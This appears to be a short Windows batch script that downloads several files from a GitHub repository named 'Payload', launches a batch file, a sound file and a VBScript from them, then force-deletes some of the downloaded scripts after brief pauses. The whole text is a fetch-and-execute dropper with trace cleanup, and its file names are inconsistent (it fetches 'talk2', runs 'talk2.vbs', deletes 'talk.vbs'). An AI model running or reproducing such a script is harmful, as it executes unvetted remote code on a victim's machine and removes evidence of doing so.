curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat
start startexc.bat
start sound.wav
start talk2.vbs
timeout 3 > nul
del /f /q "talk.vbs"
timeout 5 > nul
del /f /q "startexc.bat"
